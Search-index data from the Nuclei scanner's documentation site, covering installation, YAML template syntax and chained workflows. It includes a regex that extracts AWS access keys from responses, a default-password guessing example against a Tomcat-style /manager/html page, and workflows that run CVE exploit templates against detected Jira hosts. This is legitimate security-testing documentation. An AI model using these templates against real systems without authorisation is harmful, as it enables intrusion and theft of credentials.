{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"Home"},{"location":"get-started/","text":"Get Started \u00b6 Installing using Source \u00b6 Nuclei requires latest go version to install successfully, run the following command to install it using source - GO111MODULE = on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei Installing using Binary \u00b6 Download latest binary based on your operating system from the release page. tar -xzvf nuclei-linux-amd64.tar.gz mv nuclei /usr/bin/ nuclei -h Installing using Github \u00b6 You can also install by cloning the Github project and build it manually. git clone https://github.com/projectdiscovery/nuclei.git cd nuclei/v2/cmd/nuclei/ go build . mv nuclei /usr/local/bin/ nuclei -h Installing using Docker \u00b6 We update nuclei dockerhub image on every release, you can simply pull the dockerhub image to run. docker pull projectdiscovery/nuclei Features \u00b6 False positive free results \u00b6 This is test Fully configurable templates \u00b6 This is test Large scale scanning \u00b6 This is test Create own templates \u00b6 This is test Using nuclei \u00b6 Running single template \u00b6 nuclei -l urls.txt -t files/git-core.yaml -o git-core.txt Running multiple templates \u00b6 nuclei -l urls.txt -t files/ -t tokens/ -t cves/ -o output.txt Running with docker \u00b6 cat urls.txt | docker run -v /path-to-nuclei-templates:/go/src/app/ -i projectdiscovery/nuclei -t ./files/git-config.yaml > results.txt Automation integration \u00b6 subfinder -dL domains.txt -silent | httpx -silent | nulcei -t cves/ -o cves.txt Code contribution \u00b6 License \u00b6 MIT License Copyright \u00a9 2020 Exposed Atoms Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"Contribution"},{"location":"get-started/#get-started","text":"","title":"Get Started"},{"location":"get-started/#installing-using-source","text":"Nuclei requires latest go version to install successfully, run the following command to install it using source - GO111MODULE = on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei","title":"Installing using Source"},{"location":"get-started/#installing-using-binary","text":"Download latest binary based on your operating system from the release page. tar -xzvf nuclei-linux-amd64.tar.gz mv nuclei /usr/bin/ nuclei -h","title":"Installing using Binary"},{"location":"get-started/#installing-using-github","text":"You can also install by cloning the Github project and build it manually. git clone https://github.com/projectdiscovery/nuclei.git cd nuclei/v2/cmd/nuclei/ go build . mv nuclei /usr/local/bin/ nuclei -h","title":"Installing using Github"},{"location":"get-started/#installing-using-docker","text":"We update nuclei dockerhub image on every release, you can simply pull the dockerhub image to run. docker pull projectdiscovery/nuclei","title":"Installing using Docker"},{"location":"get-started/#features","text":"","title":"Features"},{"location":"get-started/#false-positive-free-results","text":"This is test","title":"False positive free results"},{"location":"get-started/#fully-configurable-templates","text":"This is test","title":"Fully configurable templates"},{"location":"get-started/#large-scale-scanning","text":"This is test","title":"Large scale scanning"},{"location":"get-started/#create-own-templates","text":"This is test","title":"Create own templates"},{"location":"get-started/#using-nuclei","text":"","title":"Using nuclei"},{"location":"get-started/#running-single-template","text":"nuclei -l urls.txt -t files/git-core.yaml -o git-core.txt","title":"Running single template"},{"location":"get-started/#running-multiple-templates","text":"nuclei -l urls.txt -t files/ -t tokens/ -t cves/ -o output.txt","title":"Running multiple templates"},{"location":"get-started/#running-with-docker","text":"cat urls.txt | docker run -v /path-to-nuclei-templates:/go/src/app/ -i projectdiscovery/nuclei -t ./files/git-config.yaml > results.txt","title":"Running with docker"},{"location":"get-started/#automation-integration","text":"subfinder -dL domains.txt -silent | httpx -silent | nulcei -t cves/ -o cves.txt","title":"Automation integration"},{"location":"get-started/#code-contribution","text":"","title":"Code contribution"},{"location":"get-started/#license","text":"MIT License Copyright \u00a9 2020 Exposed Atoms Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"License"},{"location":"guide/","text":"Templating Guide \u00b6 Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human readable format to quickly define the execution process. Let's start with the basics and define our own workflow file for detecting the presence of a .git/config file on a webserver and take it from there. Template Details \u00b6 Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with .yaml extension. The template files can be created any text editor of your choice. # id contains the unique identifier for the template. id : git-config ID must not contain spaces. This is done to allow easier output parsing. Information \u00b6 Next important piece of information about a template is the info block. Info block provides more context on the purpose of the template and the author . It can also contain a severity field which indicates the severity of the template. Let's add an info block to our template as well. info : # Name is the name of the template name : Git Config File Detection Template # Author is the name of the author for the template author : Ice3man # Severity is the severity for the template. severity : medium # Description optionally describes the template. description : Searches for the pattern /.git/config on passed URLs. Actual requests and corresponding matchers are placed below the info block and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired HTTP/DNS requests are made to the target sites. HTTP Requests \u00b6 Requests start with a request block which specifies the start of the requests for the template. # Start the requests for the template right here requests : Method \u00b6 First thing in the request is method . Request method can be GET , POST , PUT , DELETE , etc depending on the needs. # Method is the method for the request method : GET Redirects \u00b6 Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field. An example of the usage: requests : - method : GET path : - \"{{BaseURL}}/login.php redirects: true max-redirects: 3 Path \u00b6 The next part of the requests is the path of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime. Variables start with {{ and end with }} and are case-sensitive. BaseURL - Placing BaseURL as a variable in the path will lead to it being replaced on runtime in the request by the original URL as specified in the target file. Hostname - Hostname variable is replaced by the hostname of the target on runtime. Some sample dynamic variable replacement examples: path : {{ BaseURL }} /.git/config # This path will be replaced on execution with BaseURL # If BaseURL is set to https://abc.com then the # path will get replaced to the following: https://abc.com/.git/config Multiple paths can also be specified in one request which will be requested for the target. Headers \u00b6 Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contains the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com Body \u00b6 Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\" Session \u00b6 To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true Matchers \u00b6 Matchers are the core of nuclei. They are what make the tool so powerful. Multiple type of combinations and checks can be added to ensure that the results you get are free from false-positives. Types \u00b6 Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Status Code of Response size Content Length of Response word Response body or headers regex Response body or headers binary Response body dsl All Response Parts To match status codes for responses, you can use the following syntax. matcher : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body To match size, similar structure can be followed. If the status code of response from the site matches any single one specified in the matcher, the request is marked as successful. Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows to build more elaborated expressions with helper functions, this is an example of a complex DSL matcher: matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a HTTP response can be matched with DSL matcher: Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) This is the list for a DNS response supported by DSL matcher: Response Part Description Example rcode Response status rcode == \"NXDOMAIN question Response question section len(question) extra Response extra section len(extra) answer Response answers section len(answer) ns Response authority section len(ns) raw Full response len(raw) Conditions \u00b6 Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher. Matched Parts \u00b6 Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Example matchers for response body using the AND condition: matcher : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility. Multiple Matchers \u00b6 Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header Matchers Condition \u00b6 While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body Extractors \u00b6 Extractors are another important feature of nuclei. Extractors can be used to extract and display in results a match from the response body or headers based on available types. Types \u00b6 Multiple extractors can be specified in a request, as of now we support two type of extractors. Extractor Type Part Matched regex Response body or headers kval Response headers or cookie Example extractor for response body using regex, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor. - type : regex # part of the response to extract (can be headers, all too) part : body # regex to use for extraction. regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" To extract key-value formatted data from the header, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval part : header kval : # header value to extract from response - content-type To extract key-value formatted data from cookie, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval kval : # cookie value to extract from response - PHPSESSID Matched Parts \u00b6 Multiple parts of the response can also be extracted for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Note:- kval extractor only supported for header and cookies. Dynamic extractor \u00b6 Extractor plays an important role while writing an template for chained request which requires dynamic value to use at run time, for example CSRF tokens, headers or any values requires to complete the chain. Example of defining extractor as dynamic variable:- extractors : - type : regex name : api_key part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" Here we used extractor name as variable api_key which holds the value and can be reused in any part of the request dynamically, this feature is supported in RAW request format only. Note:- You can use internal: true when you only want to use extractor as dynamic variable, this will avoid printing extracted values in the terminal. Example HTTP Template \u00b6 The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. requests : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\" HTTP Raw requests \u00b6 Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ). requests : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3526.0 Safari/537.36 autochrome/blue Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 test=body Requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. A recent addition in raw requests has been the introduction of intruder -like functionalities. It's possible to define placeholders as {{placeholder}} , and perform Sniper , Pitchfork and ClusterBomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, Nuclei supports both file based and wordlist defined within template and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Here follows an example: id : http-raw-request info : name : Example-Fuzzing requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Supported attack types: sniper, pitchfork and clusterbomb raw : # Request with simple header manipulation with DSL functions - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close matchers : - type : status status : - 200 Here is the list of all available and supported helper functions: Helper Function Description Example len Length of a string len(\"Hello\") // Result: 5 toupper string to uppercase toupper(\"Hello\") // Result: \"HELLO\" tolower string to lowercase tolower(\"Hello\") // Result: \"hello\" replace Replace string parts replace(\"Hello\", \"He\", \"Ha\") // Result: \"Hallo\" trim Remove trailing unicode chars trim(\"aaaHelloddd\", \"ad\") // Result: \"Hello\" trimleft Remove unicode chars from left trimleft(\"aaaHelloddd\", \"ad\") // Result: \"Helloddd\" trimright Remove unicode chars from right trimleft(\"aaaHelloddd\", \"ad\") // Result: \"aaaHello\" trimspace Remove trailing spaces trimspace(\" Hello \") // Result: \"Hello\" trimprefix Trim specified prefix trimprefix(\"aaHelloaa\", \"aa\") // Result: \"Helloaa\" trimsuffix Trim specified suffix trimsuffix(\"aaHelloaa\", \"aa\") // Result: \"aaHello\" base64 Encode string to base64 base64(\"Hello\") // Result: \"SGVsbG8=\" base64_decode Decode string from base64 base64_decode(\"SGVsbG8=\") // Result: \"Hello\" url_encode URL encode a string url_encode(\" https://projectdiscovery.io/test?a=1 \") // Result: \"https:%2F%2Fprojectdiscovery.io%3Ftest=1\" url_decode URL decode a string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") // Result: \" https://projectdiscovery.io/test?a=1 \" hex_encode Hex encode a string hex_encode(\"aa\") // Result: \"6161\" hex_decode Hex decode a string hex_decode(\"6161\") // Result: \"aa\" html_escape Hex encode a string html_escape(\" test \") // Result: \"<html><body>test</body></html>\" html_unescape Hex decode a string html_unescape(\"<html><body>test</body></html>\") // Result: \" test \" md5 Calculate md5 of string md5(\"Hello\") // Result: \"8b1a9953c4611296a827abf8c47804d7\" sha256 Calculate sha256 of string sha256(\"Hello\") // Result: \"185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969\" sha1 Calculate sha1 of string sha1(\"Hello\") // Result: \" f7ff9e8 \" contains Verify if a string contains another one contains(\"Hello\", \"lo\") // Result: True regex Verify a regex versus a string regex(\"H([a-z]+)o\", \"Hello\") // Result: True DNS Requests \u00b6 Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns : DNS requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. Type \u00b6 First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A Name \u00b6 The next part of the requests is the name of the request path. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. Some sample dynamic variable replacement examples: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one question per request. Class \u00b6 Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet Recursion \u00b6 Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true Retries \u00b6 Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3 Matchers \u00b6 Matchers are just equal to HTTP, but the search is performed on the whole dns response, therefore it's not necessary to specify the part . Multiple type of combinations and checks can be added to ensure that the results you get are free from false positives. The complex dsl matcher type allows to build complex queries as described in the HTTP section. Types \u00b6 Multiple matchers can be specified in a request. There are basically 3 types of matchers: Matcher Type Part Matched word DNS Response regex DNS Response dsl DNS Response Example DNS Template \u00b6 The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and Workflows \u00b6 It's also possible to create conditional templates which executes after matching the condition from the previous templates, mostly useful for vulnerability detection and exploitation and tech based detection and exploitation, single, multiple along with directory based templates can be executed in chained workflow template. Chained workflow supports both HTTP and DNS based templates, workflow consist of two part, variable and logic which makes use of Tengo , A fast script language for Go. Variables:- You can define variable names of your choice referencing template path of your need. You can not use dash (-) in variable name (Tengo rule) Template reference supports both relative/full path. Logic:- Yaml textual string containing the workflow logic in Tengo It's possible to declare variables Supports If and For operators Provide helper functions to interact with the external OS (eg. call external program, write to external file, evaluate environment variables) Templates accepts external arguments, allowing to chain output of one as input of the other Single template chain \u00b6 Example of running single / multiple templates if detect-jira.yaml detects host running Jira application. variables : jira : panels/detect-jira.yaml jira_cve_1 : cves/CVE-2018-20824.yaml jira_cve_2 : cves/CVE-2019-3399.yaml jira_cve_3 : cves/CVE-2019-11581.yaml jira_cve_4 : cves/CVE-2017-18101.yaml logic : | if jira() { jira_cve_1() jira_cve_2() jira_cve_3() jira_cve_4() } Directory based chains \u00b6 Workflows also support directory, so you can run set of multiple templates at once, useful when scanning for tech based vulnerabilities. variables : jira : panels/detect-jira.yaml jira_pwn : local-templates/jira/ logic : | if jira() { jira_pwn() } Chaining multiple matchers \u00b6 In case of multiple matchers, you can define more specific conditions using name of the matcher, as example, here is an template running specific templates in multiple conditions. variables : tech_detect : technologies/tech-detect.yaml wp_users : files/wordpress-user-enumeration.yaml wp_xss : vulnerabilities/wordpress-xss.yaml drupal_rce : vulnerabilities/drupal-rce.yaml joomla_xss : vulnerabilities/joomla-xss.yaml logic : | tech_detect() if tech_detect[\"wordpress\"] { wp_users() wp_xss() } if tech_detect[\"drupal\"] { drupal_rce() } if tech_detect[\"joomla\"] { joomla_xss() } Here is an example of workflow for detecting Jira and running Jira exploits on found hosts. Example Workflow Template \u00b6 id : workflow-example info : name : Test Workflow Template author : pdteam variables : jira_detect : technologies/jira-detect.yaml jira_cve_1 : cves/CVE-2019-8449.yaml jira_cve_2 : cves/CVE-2019-8451.yaml jira_cve_3 : cves/CVE-2017-9506.yaml jira_cve_4 : cves/CVE-2018-20824.yaml jira_cve_5 : cves/CVE-2019-3396.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | if jira_detect(){ jira_cve_1() jira_cve_2() jira_cve_3() jira_cve_4() jira_cve_5() }","title":"Templating Guide"},{"location":"guide/#templating-guide","text":"Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human readable format to quickly define the execution process. Let's start with the basics and define our own workflow file for detecting the presence of a .git/config file on a webserver and take it from there.","title":"Templating Guide"},{"location":"guide/#template-details","text":"Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with .yaml extension. The template files can be created any text editor of your choice. # id contains the unique identifier for the template. id : git-config ID must not contain spaces. This is done to allow easier output parsing.","title":"Template Details"},{"location":"guide/#information","text":"Next important piece of information about a template is the info block. Info block provides more context on the purpose of the template and the author . It can also contain a severity field which indicates the severity of the template. Let's add an info block to our template as well. info : # Name is the name of the template name : Git Config File Detection Template # Author is the name of the author for the template author : Ice3man # Severity is the severity for the template. severity : medium # Description optionally describes the template. description : Searches for the pattern /.git/config on passed URLs. Actual requests and corresponding matchers are placed below the info block and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired HTTP/DNS requests are made to the target sites.","title":"Information"},{"location":"guide/#http-requests","text":"Requests start with a request block which specifies the start of the requests for the template. # Start the requests for the template right here requests :","title":"HTTP Requests"},{"location":"guide/#method","text":"First thing in the request is method . Request method can be GET , POST , PUT , DELETE , etc depending on the needs. # Method is the method for the request method : GET","title":"Method"},{"location":"guide/#redirects","text":"Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field. An example of the usage: requests : - method : GET path : - \"{{BaseURL}}/login.php redirects: true max-redirects: 3","title":"Redirects"},{"location":"guide/#path","text":"The next part of the requests is the path of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime. Variables start with {{ and end with }} and are case-sensitive. BaseURL - Placing BaseURL as a variable in the path will lead to it being replaced on runtime in the request by the original URL as specified in the target file. Hostname - Hostname variable is replaced by the hostname of the target on runtime. Some sample dynamic variable replacement examples: path : {{ BaseURL }} /.git/config # This path will be replaced on execution with BaseURL # If BaseURL is set to https://abc.com then the # path will get replaced to the following: https://abc.com/.git/config Multiple paths can also be specified in one request which will be requested for the target.","title":"Path"},{"location":"guide/#headers","text":"Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contains the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com","title":"Headers"},{"location":"guide/#body","text":"Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\"","title":"Body"},{"location":"guide/#session","text":"To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true","title":"Session"},{"location":"guide/#matchers","text":"Matchers are the core of nuclei. They are what make the tool so powerful. Multiple type of combinations and checks can be added to ensure that the results you get are free from false-positives.","title":"Matchers"},{"location":"guide/#types","text":"Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Status Code of Response size Content Length of Response word Response body or headers regex Response body or headers binary Response body dsl All Response Parts To match status codes for responses, you can use the following syntax. matcher : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body To match size, similar structure can be followed. If the status code of response from the site matches any single one specified in the matcher, the request is marked as successful. Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows to build more elaborated expressions with helper functions, this is an example of a complex DSL matcher: matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a HTTP response can be matched with DSL matcher: Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) This is the list for a DNS response supported by DSL matcher: Response Part Description Example rcode Response status rcode == \"NXDOMAIN question Response question section len(question) extra Response extra section len(extra) answer Response answers section len(answer) ns Response authority section len(ns) raw Full response len(raw)","title":"Types"},{"location":"guide/#conditions","text":"Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher.","title":"Conditions"},{"location":"guide/#matched-parts","text":"Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Example matchers for response body using the AND condition: matcher : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility.","title":"Matched Parts"},{"location":"guide/#multiple-matchers","text":"Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header","title":"Multiple Matchers"},{"location":"guide/#matchers-condition","text":"While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers Condition"},{"location":"guide/#extractors","text":"Extractors are another important feature of nuclei. Extractors can be used to extract and display in results a match from the response body or headers based on available types.","title":"Extractors"},{"location":"guide/#types_1","text":"Multiple extractors can be specified in a request, as of now we support two type of extractors. Extractor Type Part Matched regex Response body or headers kval Response headers or cookie Example extractor for response body using regex, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor. - type : regex # part of the response to extract (can be headers, all too) part : body # regex to use for extraction. regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" To extract key-value formatted data from the header, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval part : header kval : # header value to extract from response - content-type To extract key-value formatted data from cookie, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval kval : # cookie value to extract from response - PHPSESSID","title":"Types"},{"location":"guide/#matched-parts_1","text":"Multiple parts of the response can also be extracted for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Note:- kval extractor only supported for header and cookies.","title":"Matched Parts"},{"location":"guide/#dynamic-extractor","text":"Extractor plays an important role while writing an template for chained request which requires dynamic value to use at run time, for example CSRF tokens, headers or any values requires to complete the chain. Example of defining extractor as dynamic variable:- extractors : - type : regex name : api_key part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" Here we used extractor name as variable api_key which holds the value and can be reused in any part of the request dynamically, this feature is supported in RAW request format only. Note:- You can use internal: true when you only want to use extractor as dynamic variable, this will avoid printing extracted values in the terminal.","title":"Dynamic extractor"},{"location":"guide/#example-http-template","text":"The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. requests : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\"","title":"Example HTTP Template"},{"location":"guide/#http-raw-requests","text":"Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ). requests : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3526.0 Safari/537.36 autochrome/blue Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 test=body Requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. A recent addition in raw requests has been the introduction of intruder -like functionalities. It's possible to define placeholders as {{placeholder}} , and perform Sniper , Pitchfork and ClusterBomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, Nuclei supports both file based and wordlist defined within template and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Here follows an example: id : http-raw-request info : name : Example-Fuzzing requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Supported attack types: sniper, pitchfork and clusterbomb raw : # Request with simple header manipulation with DSL functions - 